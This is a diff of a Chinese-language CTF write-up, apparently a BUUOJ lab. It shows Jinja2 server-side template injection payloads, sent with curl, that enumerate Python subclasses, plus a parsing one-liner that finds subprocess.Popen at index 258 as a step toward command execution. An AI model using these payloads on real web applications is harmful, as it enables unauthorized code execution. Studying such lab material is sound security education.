@@ -109,12 +109,40 @@ curl -s "http://target:81/?search={{7*7}}"
 
 ### Step 2: 枚举子类，定位 subprocess.Popen
 
+先获取 `object` 的所有子类，并用 Python 脚本提取、编号：
+
 ```bash
-# 获取 object 所有子类
-curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()}}"
+# 获取 object 所有子类，并按行编号输出
+curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()}}" \
+  | python3 -c "import sys,html,re;t=sys.stdin.read();m=re.search(r'<h3>(.*?)</h3>',t);[print(f'{i}: {x}') for i,x in enumerate(html.unescape(m.group(1)).split(', '))] if m else print('no match')"
 ```
 
-本地分析子类列表，找到 `subprocess.Popen` 位于索引 258。
+可执行版本 （{} \[] 要进行url编码）
+```bash
+curl -s "http://6c46ad25-ad97-4878-8bab-f3585bec1903.node5.buuoj.cn:81/?search=%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%7D%7D" | python3 -c " import sys, html, re text = sys.stdin.read() m = re.search(r'<h3>(.*?)</h3>', text) if m: items = html.unescape(m.group(1)).split(', ') for i, item in enumerate(items): print(f'{i}: {item}') "
+```
+
+
+![](assets/file-20260528152853227.png)
+`curl` 获取原始 HTML，管道传给 Python 脚本：
+- `re.search(r'<h3>(.*?)</h3>', ...)` 从 HTML 中提取出搜索结果
+- `html.unescape()` 解码 `&#39;` `&lt;` `&gt;` 等 HTML 实体
+- 按 `, ` 拆分后逐行打印，每行前带序号
+
+然后在输出中搜索 `popen` 定位目标类：
+
+```bash
+# 直接在输出中搜索 Popen，无需先列全部再手动翻
+curl -s "http://target:81/?search={{''.__class__.__mro__[2].__subclasses__()}}" \
+  | python3 -c "import sys,html,re;t=sys.stdin.read();m=re.search(r'<h3>(.*?)</h3>',t);[print(f'{i}: {x}') for i,x in enumerate(html.unescape(m.group(1)).split(', ')) if 'popen' in x.lower()] if m else print('no match')"
+```
+
+输出：
+```
+258: <class 'subprocess.Popen'>
+```
+
+由此确定 `subprocess.Popen` 位于索引 **258**。实际做题中不需要手数，脚本编号 + grep 即可快速定位。
 
 ### Step 3: 执行命令列出文件
 
